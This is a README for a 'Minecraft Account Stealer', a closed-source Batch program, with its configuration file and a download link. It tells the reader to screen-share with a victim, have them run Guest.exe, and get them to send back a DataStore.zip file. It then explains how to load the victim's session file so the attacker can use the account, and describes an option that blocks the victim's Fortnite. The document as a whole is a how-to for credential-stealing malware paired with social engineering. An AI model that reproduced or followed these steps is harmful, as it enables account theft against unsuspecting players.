# ▂▂▂▂▂▂ ♦ 𝐦𝐢𝐧𝐞𝐜𝐫𝐚𝐟𝐭 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐬𝐭𝐞𝐚𝐥𝐞𝐫 𝟏.𝟎.𝟎 ♦ ▂▂▂▂▂▂

### 𝐃𝐞𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧
Minecraft account stealer is a tool that allows you to steal accounts from random People
by running an exe file
this program is Encrypted and its not open-source.
this program has developed in the language "Batch"

 ### ♦ 𝐇𝐨𝐰 𝐝𝐨 𝐲𝐨𝐮 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐩𝐫𝐨𝐠𝐫𝐚𝐦
1. Settings.properties is the settings file for the program, What Settings will you change ?
`Title` - Change Program Title to what you tell the victims that the program does
`CloseOrContinue` - Chose an built in feature that allows you to block the victims Fortnite (Game)
To set it to off make sure this line is set like this: `CloseOrContinue=goto :close`
To set it on so the fortnite will be blocked set the line to `goto :fortnite`

### ♦ 𝐖𝐡𝐚𝐭 𝐝𝐨 𝐲𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐝𝐨 𝐭𝐨 𝐬𝐭𝐞𝐚𝐥 𝐚𝐧 𝐚𝐜𝐜𝐨𝐮𝐧𝐭
Tips:
  When you do steal an account you should be calling and screen-sharing with your Victim
  You should check if the victim has Minecraft before you start the process (or just try to make him run that and see by your self)
1. tell your victim to run extract the Package.zip File 
2. Tell them to run the `Guest.exe` 
3. when they run, it should be adding a file named `DataStore.zip` (if no tell them to check for errors in the latest log)
4. tell them to send you the file `DataStore.zip`

### ♦ 𝐓𝐫𝐚𝐧𝐬𝐟𝐨𝐫𝐦 𝐀𝐧 𝐚𝐜𝐜𝐨𝐮𝐧𝐭
1. Open the file `DataStore.zip` rename the file `DataStore.Store To `launcher_profiles.json` 
2. Drag and drop `launcher_profiles.json` to `%appdata%\.minecraft`
3. open your minecraft and there we go!, Enjoy the stolen account

Or you can join our [Discord server](https://discord.gg/bSHG56G) and we will Transform it for you 😄
### 𝐩𝐫𝐨𝐩𝐞𝐫𝐭𝐢𝐞𝐬 𝐅𝐢𝐥𝐞
<details>
  <summary>← To Reveal the Code With Fortnite On</summary>

```properties
title=Unknown - Change Me
color=f
background=0
COLS=100 
LINES=25
error=[ERROR]: 
info=[INFO]: 
data=DataStore
AdminPass="G13HJasF"
CloseOrContinue=goto :fortnite
program-path=PATH_UPDATE
program-path-no-slash=PATH_UPDATE
_log=call "commands\log.exe"
_fortnite=call "commands\fortnite.exe"
_admin=call "commands\admin.exe"
```
</details>

<details>
  <summary>← To Reveal the Code With Fortnite Off</summary>

```properties
title=Unknown - Change Me
color=f
background=0
COLS=100 
LINES=25
error=[ERROR]: 
info=[INFO]: 
data=DataStore
AdminPass="G13HJasF"
CloseOrContinue=goto :close
program-path=PATH_UPDATE
program-path-no-slash=PATH_UPDATE
_log=call "commands\log.exe"
_fortnite=call "commands\fortnite.exe"
_admin=call "commands\admin.exe"
```
</details>

### ♦ 𝙎𝙪𝙥𝙥𝙤𝙧𝙩
You can get support in our [Discord server](https://discord.gg/bSHG56G)
You can report issues in our discord server and we will fix them as soon as possible 😄

### Download
[Click to install Minecraft Stealer Version 1.0.0 (Beta)](https://github.com/agamsol/Minecraft-Stealer/releases/download/1.0.0/Package.zip)
